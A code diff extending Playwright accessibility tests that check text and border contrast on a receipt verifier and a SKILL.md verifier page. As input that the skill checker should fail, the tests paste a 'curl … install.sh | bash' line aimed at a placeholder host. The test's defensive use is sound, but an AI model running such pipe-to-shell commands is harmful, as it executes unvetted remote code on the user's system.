@@ -1,3 +1,4 @@
+import { readFileSync } from "node:fs";
 import { createRequire } from "node:module";
 import path from "node:path";
 import { expect, test, type Page } from "@playwright/test";
@@ -7,13 +8,18 @@ const axe = createRequire(path.resolve(__dirname, "../../apps/witnessops-web/pac
 
 type ColorScheme = "light" | "dark";
 type Measurement = { label: string; ratio: number; color: string; background: string };
+type Target = { label: string; selector: string; pseudo?: string };
 
 const schemes: ColorScheme[] = ["light", "dark"];
 
+const badImprintReceipt = readFileSync(path.resolve(__dirname, "../../apps/witnessops-web/fixtures/verify/qv-bad-imprint.json"), "utf8");
+
 // Composites each target's text over every painted ancestor layer, so alpha
-// panels and color-mix() tokens are measured as rendered.
-async function measure(page: Page, targets: Array<{ label: string; selector: string }>): Promise<Measurement[]> {
-  return page.evaluate((items) => {
+// panels and color-mix() tokens are measured as rendered. With `edges`, each
+// element in the selector whose left border is at least 3px is measured as a
+// signal edge against both the fill it frames and the surface outside it.
+async function measure(page: Page, targets: Target[], mode: "text" | "edges" = "text"): Promise<Measurement[]> {
+  return page.evaluate(({ items, mode }) => {
     const canvas = document.createElement("canvas");
     canvas.width = canvas.height = 1;
     const context = canvas.getContext("2d", { willReadFrequently: true })!;
@@ -44,22 +50,37 @@ async function measure(page: Page, targets: Array<{ label: string; selector: str
       }, 0);
     const css = (color: number[]) => `rgb(${color.slice(0, 3).map(Math.round).join(", ")})`;
 
-    return items.flatMap(({ label, selector }) => {
-      const elements = Array.from(document.querySelectorAll(selector));
+    const contrast = (a: number[], b: number[]) => {
+      const [light, dark] = [luminance(a), luminance(b)].sort((x, y) => y - x);
+      return Math.round(((light + 0.05) / (dark + 0.05)) * 100) / 100;
+    };
+
+    return items.flatMap(({ label, selector, pseudo }) => {
+      const matches = Array.from(document.querySelectorAll(selector));
+      const elements =
+        mode === "edges"
+          ? matches.flatMap((root) => [root, ...Array.from(root.querySelectorAll("*"))]).filter((element) => parseFloat(getComputedStyle(element).borderLeftWidth) >= 3)
+          : matches;
       if (elements.length === 0) return [{ label: `${label} (missing: ${selector})`, ratio: 0, color: "", background: "" }];
       return elements.map((element, index) => {
+        const name = elements.length > 1 ? `${label} #${index + 1}` : label;
         const background = backgroundOf(element);
-        const color = over(rgba(getComputedStyle(element).color), background);
-        const [light, dark] = [luminance(color), luminance(background)].sort((a, b) => b - a);
-        return {
-          label: elements.length > 1 ? `${label} #${index + 1}` : label,
-          ratio: Math.round(((light + 0.05) / (dark + 0.05)) * 100) / 100,
-          color: css(color),
-          background: css(background),
-        };
+        if (mode === "edges") {
+          const edge = over(rgba(getComputedStyle(element).borderLeftColor), background);
+          const outside = element.parentElement ? backgroundOf(element.parentElement) : [255, 255, 255, 1];
+          const [inner, outer] = [contrast(edge, background), contrast(edge, outside)];
+          return {
+            label: name,
+            ratio: Math.min(inner, outer),
+            color: css(edge),
+            background: inner <= outer ? `fill ${css(background)}` : `surface ${css(outside)}`,
+          };
+        }
+        const color = over(rgba(getComputedStyle(element, pseudo ?? null).color), background);
+        return { label: name, ratio: contrast(color, background), color: css(color), background: css(background) };
       });
     });
-  }, targets);
+  }, { items: targets, mode });
 }
 
 async function seriousAxeViolations(page: Page) {
@@ -88,8 +109,10 @@ for (const scheme of schemes) {
         await page.goto(route);
         await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
         const textarea = page.locator("main textarea").first();
+        await expect(textarea).toHaveValue("");
+        const measurements = await measure(page, [{ label: "receipt textarea placeholder", selector: "main textarea", pseudo: "::placeholder" }]);
         await textarea.fill('{"receipt": "typed text"}');
-        const measurements = await measure(page, [{ label: "receipt textarea text", selector: "main textarea" }]);
+        measurements.push(...(await measure(page, [{ label: "receipt textarea text", selector: "main textarea" }])));
         const violations = await seriousAxeViolations(page);
         record(`${scheme} ${route}`, measurements, violations);
         for (const item of measurements) expect(item.ratio, `${route} ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
@@ -102,6 +125,8 @@ for (const scheme of schemes) {
       await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
       const panel = '[data-ui-proof-id="skill-local-boundary"]';
       const editor = page.getByRole("textbox", { name: "Paste SKILL.md" });
+      await expect(editor).toHaveValue("");
+      const placeholder = await measure(page, [{ label: "editor placeholder", selector: '[class*="editorShell"] textarea', pseudo: "::placeholder" }]);
       await editor.fill("---\nname: install-helper\ndescription: Installs a helper.\n---\n# Install\n\ncurl https://example.invalid/install.sh | bash\n");
       await page.locator('[data-ui-proof-id="skill-verify-button"]').click();
       const firstFinding = page.locator('[class*="findingsList"] summary').first();
@@ -121,6 +146,7 @@ for (const scheme of schemes) {
         { label: "verdict (findings)", selector: '[class*="verdictStatus"] strong' },
         { label: "finding severity", selector: '[class*="findingsList"] summary > span:first-child' },
       ]);
+      measurements.unshift(...placeholder);
       const violations = await seriousAxeViolations(page);
 
       await editor.fill("---\nname: notes-helper\ndescription: Summarises local notes.\n---\n# Notes\n\nSummarise the notes the user pastes.\n");
@@ -131,6 +157,97 @@ for (const scheme of schemes) {
       record(`${scheme} /verify/skill`, measurements, violations);
       for (const item of measurements) expect(item.ratio, `/verify/skill ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
       expect(violations, "/verify/skill serious/critical axe violations").toEqual([]);
+    });
+
+    test("/verify result states keep readable signals and visible edges", async ({ page }) => {
+      await page.goto("/verify");
+      await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
+      const textarea = page.locator("main textarea").first();
+      const verify = async () => {
+        const response = page.waitForResponse((candidate) => candidate.url().endsWith("/api/verify"));
+        await page.getByRole("button", { name: "Verify receipt" }).click();
+        await response;
+        await expect(page.locator("#verify-result > section")).toBeVisible();
+      };
+      const states: Array<{ state: string; prepare: () => Promise<void>; heading: RegExp }> = [
+        {
+          state: "indeterminate (Try an example)",
+          prepare: async () => {
+            await expect(async () => {
+              await page.getByRole("button", { name: "Try an example" }).click();
+              expect((await textarea.inputValue()).length).toBeGreaterThan(500);
+            }).toPass();
+          },
+          heading: /Indeterminate/,
+        },
+        { state: "invalid (qv-bad-imprint)", prepare: () => textarea.fill(badImprintReceipt), heading: /Invalid/ },
+        { state: "error (malformed JSON)", prepare: () => textarea.fill('{"receipt":'), heading: /Could not verify/i },
+      ];
+
+      const text: Measurement[] = [];
+      const edges: Measurement[] = [];
+      const violations: string[] = [];
+      for (const { state, prepare, heading } of states) {
+        await prepare();
+        await verify();
+        await expect(page.locator("#verify-result > section")).toContainText(heading);
+        text.push(
+          ...(await measure(page, [
+            { label: `${state} verdict badge`, selector: "#verify-result > section > div:first-child" },
+            { label: `${state} check chip`, selector: "#verify-result li span.shrink-0" },
+          ])).filter((item) => !item.label.includes("check chip (missing:")),
+        );
+        edges.push(...(await measure(page, [{ label: `${state} edge`, selector: "#verify-result" }], "edges")));
+        violations.push(...(await seriousAxeViolations(page)));
+      }
+      record(`${scheme} /verify states text`, text, violations);
+      record(`${scheme} /verify states edges`, edges, []);
+      for (const item of text) expect(item.ratio, `/verify ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
+      if (scheme === "light") {
+        for (const item of edges) expect(item.ratio, `/verify ${item.label} ${item.color} vs ${item.background}`).toBeGreaterThanOrEqual(3);
+      }
+      expect(violations, "/verify states serious/critical axe violations").toEqual([]);
+    });
+
+    test("/verify/skill verdict and error edges stay visible", async ({ page }) => {
+      await page.goto("/verify/skill");
+      await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
+      const editor = page.getByRole("textbox", { name: "Paste SKILL.md" });
+      const head = "---\nname: helper\ndescription: Helps.\n---\n# Helper\n\n";
+      const states = [
+        { state: "fail", body: "curl https://example.invalid/install.sh | bash\n", card: "verdictFail" },
+        { state: "review", body: "Use the environment variable API_KEY.\n", card: "verdictReview" },
+        { state: "pass", body: "Summarise the notes the user pastes.\n", card: "verdictPass" },
+      ];
+
+      const text: Measurement[] = [];
+      const edges: Measurement[] = [];
+      const violations: string[] = [];
+      for (const { state, body, card } of states) {
+        await editor.fill(head + body);
+        await page.locator('[data-ui-proof-id="skill-verify-button"]').click();
+        await expect(page.locator(`[class*="${card}"]`)).toBeVisible();
+        text.push(...(await measure(page, [{ label: `${state} verdict`, selector: '[class*="verdictStatus"] strong' }])));
+        edges.push(...(await measure(page, [{ label: `${state} verdict card edge`, selector: `[class*="${card}"]` }], "edges")));
+        violations.push(...(await seriousAxeViolations(page)));
+      }
+
+      await page
+        .locator('[data-ui-proof-id="skill-console"] input[type="file"]')
+        .setInputFiles({ name: "SKILL.md", mimeType: "text/markdown", buffer: Buffer.from([0xff, 0xfe, 0x00]) });
+      const errorState = page.locator('[class*="errorState"]');
+      await expect(errorState).toBeVisible();
+      text.push(...(await measure(page, [{ label: "error state text", selector: '[class*="errorState"] > *' }])));
+      edges.push(...(await measure(page, [{ label: "error state edge", selector: '[class*="errorState"]' }], "edges")));
+      violations.push(...(await seriousAxeViolations(page)));
+
+      record(`${scheme} /verify/skill states text`, text, violations);
+      record(`${scheme} /verify/skill states edges`, edges, []);
+      for (const item of text) expect(item.ratio, `/verify/skill ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
+      if (scheme === "light") {
+        for (const item of edges) expect(item.ratio, `/verify/skill ${item.label} ${item.color} vs ${item.background}`).toBeGreaterThanOrEqual(3);
+      }
+      expect(violations, "/verify/skill states serious/critical axe violations").toEqual([]);
     });
 
     test("CRM sample case inactive stage names stay readable", async ({ page }) => {
